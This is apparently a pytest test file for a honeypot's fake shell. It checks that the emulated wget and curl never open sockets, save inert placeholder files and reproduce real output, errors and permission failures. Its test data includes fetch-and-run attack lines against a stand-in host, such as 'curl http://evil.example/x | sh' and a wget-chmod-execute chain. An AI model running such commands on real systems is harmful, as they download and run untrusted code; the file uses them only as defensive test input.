"""wget and curl are text only. these run with socket creation and name lookups blocked."""

import socket

import _socket
import pytest


class Blocked(AssertionError):
    pass


def _refuse(*args, **kwargs):
    raise Blocked("network use attempted")


class _NoSocket:
    def __init__(self, *args, **kwargs):
        raise Blocked("socket created")


@pytest.fixture
def no_sockets(monkeypatch):
    """any socket, connection or dns lookup fails the test."""
    for mod in (socket, _socket):
        monkeypatch.setattr(mod, "socket", _NoSocket)
        for name in ("getaddrinfo", "gethostbyname", "gethostbyname_ex", "gethostbyaddr", "getnameinfo", "socketpair"):
            if hasattr(mod, name):
                monkeypatch.setattr(mod, name, _refuse)
    monkeypatch.setattr(socket, "create_connection", _refuse)


def test_the_guard_really_blocks(no_sockets):
    with pytest.raises(Blocked):
        socket.socket()
    with pytest.raises(Blocked):
        socket.getaddrinfo("example.com", 80)
    with pytest.raises(Blocked):
        socket.create_connection(("example.com", 80))


@pytest.mark.parametrize(
    "line",
    [
        "wget http://evil.example/bins/x86",
        "wget -q -O /tmp/a https://evil.example:8443/a",
        "wget -qO- http://evil.example/a.sh",
        "wget -P /tmp/drop http://203.0.113.9/b",
        "wget -b http://evil.example/c",
        "curl -O http://evil.example/bins/arm7",
        "curl -fsSL https://evil.example/install.sh",
        "curl -s -o /tmp/k http://evil.example/k",
        "curl -v http://evil.example/v",
        "curl -I http://evil.example/",
        "curl -s -o /dev/null -w '%{http_code} %{remote_ip}' http://evil.example/",
        "curl http://evil.example/x | sh",
        "cd /tmp && wget http://evil.example/x && chmod +x x && ./x",
    ],
)
def test_downloads_never_touch_the_network(no_sockets, sh, line):
    sh(line)


def test_wget_saves_a_placeholder_that_will_not_run(no_sockets, sh):
    out = sh("cd /tmp; wget http://evil.example.com/bins/x86.sh 2>&1")
    assert "--  http://evil.example.com/bins/x86.sh" in out
    assert "Resolving evil.example.com (evil.example.com)... " in out
    assert "Connecting to evil.example.com (evil.example.com)|" in out
    assert "Saving to: ‘x86.sh’" in out and "‘x86.sh’ saved [12/12]" in out
    assert sh("cat /tmp/x86.sh") == "placeholder\n"
    assert "Permission denied" in sh("./x86.sh 2>&1")
    res = sh("chmod +x x86.sh; ./x86.sh 2>&1")
    assert res == "-bash: ./x86.sh: cannot execute binary file: Exec format error\n"
    assert sh.state.last_status == 126
    # running it by full path, or from a script, says the same
    assert "Exec format error" in sh("/tmp/x86.sh 2>&1")


def test_editing_the_download_makes_it_a_normal_file(sh):
    sh("cd /tmp; wget -q http://evil.example/s.sh; chmod +x s.sh; echo 'echo hi' > s.sh")
    assert sh("./s.sh") == "hi\n"


def test_wget_names_and_hosts(no_sockets, sh):
    sh("cd /tmp; wget -q http://a.example/f; wget -q http://b.example/f")
    assert sh.state.fs.exists("/tmp/f") and sh.state.fs.exists("/tmp/f.1")
    assert "Saving to: ‘index.html’" in sh("wget http://a.example/ 2>&1")
    # ip literals skip the resolving line
    out = sh("wget http://203.0.113.9/b 2>&1")
    assert "Resolving" not in out and "Connecting to 203.0.113.9:80... connected." in out
    # names come from the fake /etc/hosts
    assert "Resolving localhost (localhost)... 127.0.0.1" in sh("wget -O /dev/null http://localhost/ 2>&1")
    assert "|10.0.4.17|:443" in sh("wget -O /dev/null https://qf-web-01.quillfern.lan/ 2>&1")
    # anyone else gets a stable documentation address
    first = sh("wget -O /dev/null http://c.example/ 2>&1")
    assert first.split("Resolving c.example (c.example)... ")[1].split("\n")[0].startswith(("192.0.2.", "198.51.100.", "203.0.113."))
    assert first.split("Resolving")[1].split("\n")[0] == sh("wget -O /dev/null http://c.example/ 2>&1").split("Resolving")[1].split("\n")[0]


def test_wget_to_stdout_and_errors(no_sockets, sh):
    assert sh("wget -qO- http://evil.example/a.sh") == "placeholder\n"
    assert sh("wget -q http://evil.example/a.sh -O - | wc -l").strip() == "1"
    assert "wget: missing URL" in sh("wget 2>&1")
    assert "Unsupported scheme ‘gopher’" in sh("wget gopher://x 2>&1")
    assert sh("wget -q http://e.example/x") == "" and sh.state.fs.exists("/root/x")


def test_wget_respects_permissions(engine, base, no_sockets):
    state = engine.new_state("deploy", tty=False, base=base)
    res = engine.run(state, "wget -q -O /etc/evil http://evil.example/e 2>&1")
    assert "Cannot write to ‘/etc/evil’ (Permission denied)." in res.out and res.code == 3
    assert not state.fs.exists("/etc/evil")


def test_curl_outputs(no_sockets, sh):
    assert sh("curl -fsSL https://evil.example/install.sh") == "placeholder\n"
    out = sh("cd /tmp; curl -O http://evil.example/bins/arm7 2>&1")
    assert "% Total    % Received % Xferd" in out
    assert sh("cat /tmp/arm7") == "placeholder\n"
    assert "Exec format error" in sh("chmod 755 /tmp/arm7; /tmp/arm7 2>&1")
    assert sh("curl -s -o /tmp/k http://evil.example/k") == "" and sh("cat /tmp/k") == "placeholder\n"
    assert sh("curl -s -o /dev/null -w '%{http_code}' http://evil.example/") == "200"
    head = sh("curl -sI http://evil.example/")
    assert head.startswith("HTTP/1.1 200 OK\r\n") and "Content-Length: 12\r\n" in head
    verbose = sh("curl -v http://evil.example/v 2>&1")
    assert "*   Trying " in verbose and "> GET /v HTTP/1.1" in verbose and "> Host: evil.example" in verbose


def test_curl_errors(no_sockets, sh):
    assert "curl: try 'curl --help'" in sh("curl 2>&1") and sh.state.last_status == 2
    assert 'Protocol "gopher" not supported' in sh("curl gopher://x 2>&1")
    assert "Remote file name has no length!" in sh("curl -O http://evil.example/ 2>&1")
    # -s hides errors unless -S
    assert sh("curl -s gopher://x 2>&1") == ""
    assert "not supported" in sh("curl -sS gopher://x 2>&1")


def test_curl_respects_permissions(engine, base, no_sockets):
    state = engine.new_state("deploy", tty=False, base=base)
    res = engine.run(state, "curl -o /etc/evil http://evil.example/e 2>&1")
    assert "Failed to create the file /etc/evil: Permission denied" in res.out and res.code == 23


def test_overlay_caps_still_apply(sh, monkeypatch):
    from honeypot import vfs

    monkeypatch.setattr(vfs, "MAX_OVERLAY_ENTRIES", len(sh.state.fs.entries))
    assert "Cannot write to" in sh("wget http://evil.example/z 2>&1")
